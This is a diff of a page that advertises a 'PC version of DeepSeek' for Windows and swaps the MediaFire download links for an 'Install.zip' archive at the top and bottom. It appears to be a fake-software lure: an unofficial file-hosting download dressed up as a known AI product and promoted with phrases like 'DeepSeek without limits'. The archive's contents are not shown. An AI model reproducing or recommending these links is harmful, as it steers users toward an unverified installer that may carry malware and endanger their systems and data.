@@ -1,7 +1,7 @@
 # PC Version of DeepSeek Neural Network for Windows  
 
 **Download the installer:**  
-[Download for Windows](https://download1589.mediafire.com/qz1faket3rhgqt62WkGlORECQzo9yTI2vphKBrEQ8oWxe-mxZJqq_0wtCLHeizltBeuyPjEinHZueYc8ZY_9pThsmHv2QoTvgqhh9orJqT0OYxK7YH2y38qepKnWqAmImDxo8s1Er_qLKlUJ4MtNTV1I5FgaOAd7AO93aShWwO8J/su9w03xejhq84p3/Install.zip) 
+[Download for Windows](https://download1589.mediafire.com/5qwt6om51a2gBG4K2xNOdbdQzc6EtnEEkXGo2cGJFSf7Qxrs53mRbwx4Q63ajvGW-UJslfRNAExbwzDostelnvn6zeZtalqbJQbMXG6UMAzyGupd380G49bu0cdzCubmRyu370EjR28hd2_LjPNGMaZrORmvVxgTov0NSvQW4chT/su9w03xejhq84p3/Install.zip) 
 
 ---
 
@@ -69,6 +69,6 @@ PC version of DeepSeek, neural network for Windows, DeepSeek without limits, Dee
 
 ## **Start Using DeepSeek Today!**  
 
-[**Download the PC version of DeepSeek**](https://download1589.mediafire.com/qz1faket3rhgqt62WkGlORECQzo9yTI2vphKBrEQ8oWxe-mxZJqq_0wtCLHeizltBeuyPjEinHZueYc8ZY_9pThsmHv2QoTvgqhh9orJqT0OYxK7YH2y38qepKnWqAmImDxo8s1Er_qLKlUJ4MtNTV1I5FgaOAd7AO93aShWwO8J/su9w03xejhq84p3/Install.zip) and discover all the capabilities of powerful AI on your computer.  
+[**Download the PC version of DeepSeek**](https://download1589.mediafire.com/5qwt6om51a2gBG4K2xNOdbdQzc6EtnEEkXGo2cGJFSf7Qxrs53mRbwx4Q63ajvGW-UJslfRNAExbwzDostelnvn6zeZtalqbJQbMXG6UMAzyGupd380G49bu0cdzCubmRyu370EjR28hd2_LjPNGMaZrORmvVxgTov0NSvQW4chT/su9w03xejhq84p3/Install.zip) and discover all the capabilities of powerful AI on your computer.  
 
 ---
